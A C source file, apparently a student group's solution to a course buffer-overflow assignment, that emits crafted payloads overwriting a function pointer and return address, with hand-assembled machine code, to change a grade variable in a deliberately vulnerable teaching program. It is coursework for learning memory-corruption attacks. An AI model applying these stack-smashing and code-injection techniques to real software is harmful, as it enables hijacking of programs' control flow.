/*
Single Author Info:
prajago4     Priyadarshini Rajagopal

Group info:
dvvira       Denil Vijay Vira
prajago4     Priyadarshini Rajagopal
wli29        Wanqiu Li

*/

#include<string.h>
#include<stdio.h>
char buf[200];

/*
 E program: Indices 72-75 store the address of the function call f(). Thus, overwriting just the 73rd index with '\n' will cause the program to produce a SIGSEGV when f() is called. 
 */
void fe()
{
 int i;
 buf[73]='\n';
 write(1,buf,74);

}

/*
 D program : Indices 72-75 stores the address of the function call f(). This address has to be replaced by the address of the setGradeToD() function call in order to produce a D grade. Thus the indices from 72-75 are overwritten with another valid address 0x004007b8 to call setGradeToD
 */
void fd()
{
 buf[72]=0xb8; 
 buf[73]=0x07;
 buf[74]=0x40;
 buf[75]=0x00;
 write(1,buf,76);
}

/*
 C program : Indices 120-123 hold the address in the main function that the readString function returns to. This return address is changed such that the readString function jumps to the place inside the main function exactly where the grade is set to C. It "must" skip the condition that checks the name with the string "Andrew Appel". The address 0x0040081e is stored in the indices from 120-123

The checkName function should be called as normal, thus the 72-75th indices hold the address of the checkName function.

  */
void fc()
{
 buf[0] = 'F';
 buf[1] = 'r';
 buf[2] = 'a';
 buf[3] = 'n';
 buf[4] = 'k'; 

 //To make sure checkName is called after overwriting the 120-125 indices in the next set of statements
 buf[72]=0x59; 
 buf[73]=0x08;
 buf[74]=0x40;
 buf[75]=0x00;

 //To overwrite the return address of the readString function with a specific address in the main to set grade to C
 buf[120]=0x1e;
 buf[121]=0x08;
 buf[122]=0x40;
 buf[123]=0x00;

 write(1,buf,124);

}

/*
 Program B : The buffer is overwritten with the 
(1)name: from indices 0-4
(2)A machine language program that stores 'B' in the variable 'grade' : from indices 7-14:
The instruction used to move 'B', 0x42 into the variable grade with address 0x600d84 is:
movb $0x42, (0x600d84)
(3)An address:from indices 15-20: that jumps back to the address in readString function after the call to f(s) so that program executes normally
(4) address of f(s) :from indices 72-75 : with the address in the buffer that holds our instruction at buf[7]
 */
void fb()
{
 buf[0] = 'F';
 buf[1] = 'r';
 buf[2] = 'a';
 buf[3] = 'n';
 buf[4] = 'k';

 //Set Grade to B with instruction movb $0x42, 0x600d84
 buf[7] = 0xc6;
 buf[8] = 0x04;
 buf[9] = 0x25;
 buf[10] = 0x84;
 buf[11] = 0x0d;
 buf[12] = 0x60;
 buf[13] = 0x00;
 buf[14] = 0x42;
 
 //return back to readString after f(s)
 buf[15] = 0x68;
 buf[16] = 0x81;
 buf[17] = 0x07;
 buf[18] = 0x40;
 buf[19] = 0x00;
 buf[20] = 0xc3; 

 // Overwrite f(s) with our instruction at buf[7]
 buf[72] = 0xc7; 
 buf[73] = 0x0d;
 buf[74] = 0x60;
 buf[75] = 0x00;

 write(1,buf,76);
}

/*
 Program A : The buffer is overwritten with the 
(1)name: from indices 0-4
(2)A machine language program that stores 'A' in the variable 'grade' : from indices 7-14:
The instruction used to move 'A', 0x41 into the variable grade with address 0x600d84 is:
movb $0x41, (0x600d84)
(3)An address:from indices 15-20: that jumps back to the address in readString function after the call to f(s) so that program executes normally
(4) address of f(s) :from indices (72-75),(88-91) and (104-107)- these are only locations in which address of f(s) is stored for any random integer between 0-31 generated : with the address in the buffer that holds our instruction at buf[7]
 */

void fa()
{
 //(1)Name
 buf[0] = 'F';
 buf[1] = 'r';
 buf[2] = 'a';
 buf[3] = 'n';
 buf[4] = 'k';

 //(2)Set Grade to A
 buf[7] = 0xc6;
 buf[8] = 0x04;
 buf[9] = 0x25;
 buf[10] = 0x84;
 buf[11] = 0x0d;
 buf[12] = 0x60;
 buf[13] = 0x00;
 buf[14] = 0x41;
 
 //(3)return back to readString after f(s)
 buf[15] = 0x68;
 buf[16] = 0x81;
 buf[17] = 0x07;
 buf[18] = 0x40;
 buf[19] = 0x00;
 buf[20] = 0xc3; 

 //(4) Overwrite f(s) with our instruction at buf[7]
 buf[72] = 0xc7; 
 buf[73] = 0x0d;
 buf[74] = 0x60;
 buf[75] = 0x00;

 buf[88] = 0xc7; 
 buf[89] = 0x0d;
 buf[90] = 0x60;
 buf[91] = 0x00;
 
 buf[104] = 0xc7; 
 buf[105] = 0x0d;
 buf[106] = 0x60;
 buf[107] = 0x00;

 write(1,buf,108);
}

/*
 s program : Indices 104-107 hold the address in the main function that the readString function returns to. This return address is changed such that the readString function jumps to the place inside the main function exactly where the grade is set to C. It "must" skip the condition that checks the name with the string "Andrew Appel". The address 0x004028e3 is stored in the indices from 104-107
*/
void fs()
{
 buf[0] = 'F';
 buf[1] = 'r';
 buf[2] = 'a';
 buf[3] = 'n';
 buf[4] = 'k'; 

 buf[104]=0xe3;
 buf[105]=0x28;
 buf[106]=0x40;
 buf[107]=0x00;

 write(1,buf,108);

}

int main(int argc, char *argv[])
{
 strcpy(buf,"Frank");
 char opt = argv[1][0];
 if(opt == 'a')
    fa();
 else 
 if(opt == 'b')
    fb();
 
 else 
 if(opt == 'c')
    fc();
 else 
 if(opt == 'd')
    fd();
 else 
 if(opt == 'e')
    fe();
 else 
 if(opt == 's')
    fs();
 return 0;
}
